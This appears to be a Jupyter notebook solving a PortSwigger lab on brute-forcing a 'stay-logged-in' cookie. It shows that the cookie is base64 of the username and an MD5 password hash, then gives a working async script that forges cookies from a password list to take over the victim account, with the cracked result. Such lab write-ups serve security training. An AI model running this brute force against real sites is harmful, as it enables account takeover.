{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "79acd814",
   "metadata": {},
   "source": [
    "[See here for lab](https://portswigger.net/web-security/authentication/other-mechanisms/lab-brute-forcing-a-stay-logged-in-cookie)\n",
    "\n",
    "Your credentials: `wiener:peter`\\\n",
    "Victim's username: `carlos`"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "id": "e4b81fd1",
   "metadata": {},
   "outputs": [],
   "source": [
    "import asyncio\n",
    "import aiohttp\n",
    "\n",
    "#Important for jupyter\n",
    "import nest_asyncio\n",
    "nest_asyncio.apply()\n",
    "\n",
    "#Other\n",
    "import requests\n",
    "import base64\n",
    "import tqdm.notebook as tq\n",
    "\n",
    "from load_un_pw import get_un_pw #usernames, passwords = get_un_pw()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "id": "86c518e7",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'d2llbmVyOjUxZGMzMGRkYzQ3M2Q0M2E2MDExZTllYmJhNmNhNzcw'"
      ]
     },
     "execution_count": 2,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "URL = \"https://acb51f3b1e0edf5bc02fedde00c300aa.web-security-academy.net/\"\n",
    "\n",
    "#Lets start by looking at the cookies we get if we log in...\n",
    "my_data = {\"username\" : \"wiener\", \"password\" : \"peter\"}\n",
    "\n",
    "s = requests.session()\n",
    "r = s.post(URL + \"login\", data = my_data | {\"stay-logged-in\" : \"on\"})\n",
    "\n",
    "if r.status_code == 504:\n",
    "    print(\"session timed out\")\n",
    "    \n",
    "sli_cookie = s.cookies.get_dict()[\"stay-logged-in\"]\n",
    "sli_cookie"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "id": "7142ea5d",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "b'wiener:51dc30ddc473d43a6011e9ebba6ca770'"
      ]
     },
     "execution_count": 3,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "base64.b64decode(sli_cookie)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "284ebaa1",
   "metadata": {},
   "source": [
    "Ok cool so it looks like our 'stay logged in' cookie is a base64 encoding of our password and the string `51dc30dd...`. Let's reset the session and see how it changes."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "id": "872df65a",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "b'wiener:51dc30ddc473d43a6011e9ebba6ca770'"
      ]
     },
     "execution_count": 4,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "my_data = {\"username\" : \"wiener\", \"password\" : \"peter\"}\n",
    "s = requests.session()\n",
    "r = s.post(URL + \"login\", data = my_data | {\"stay-logged-in\" : \"on\"})\n",
    "base64.b64decode(s.cookies.get_dict()[\"stay-logged-in\"])"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "017db579",
   "metadata": {},
   "source": [
    "It's the same again. So the next thing I tried was to put my uername and password into a hashing function, which I did [here](https://dencode.com/en/hash).\\\n",
    "It turns out the second string is just the password put through MD5.\\\n",
    "Now I think we have enough information to try and brute force this."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "id": "452e9a89",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'51dc30ddc473d43a6011e9ebba6ca770'"
      ]
     },
     "execution_count": 5,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "#Verify that our MD5 hashing process works\n",
    "\n",
    "import hashlib\n",
    "hashlib.md5(\"peter\".encode(\"utf-8\")).hexdigest()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "id": "4f0bb92a",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "fba4ea06d8fb4fbda40ce99d7f9272da",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/100 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/plain": [
       "[['zxcvbn', True]]"
      ]
     },
     "execution_count": 6,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "#Grab a list of passwords\n",
    "usernames, passwords = get_un_pw()\n",
    "\n",
    "async def fetch(session, each_pw):\n",
    "    hashed_pw = hashlib.md5(each_pw.encode(\"utf-8\")).hexdigest()\n",
    "    #Convert to base64 string (involves some encoding and decoding :S)\n",
    "    sli_key = base64.b64encode((\"carlos:\" + hashed_pw).encode()).decode()\n",
    "    #run get\n",
    "    async with session.get(URL + \"my-account\", cookies = {\"stay-logged-in\" : sli_key}) as resp:\n",
    "        text = await resp.text()\n",
    "        return [each_pw, \"Your username is:\" in text]\n",
    "\n",
    "async def main():\n",
    "    async with aiohttp.ClientSession() as session:\n",
    "        #loop through all passwords\n",
    "        tasks = []\n",
    "        for each_pw in passwords:\n",
    "            tasks.append(fetch(session, each_pw))\n",
    "                   \n",
    "        return [await f for f in tq.tqdm(asyncio.as_completed(tasks), total=len(tasks))]\n",
    "            \n",
    "result = asyncio.run(main())\n",
    "[x for x in result if x[1] == True]"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "f548719d",
   "metadata": {},
   "source": [
    "Success!\n",
    "\n",
    "Also, this code runs pretty fast."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "91fe1b90",
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.9.6"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
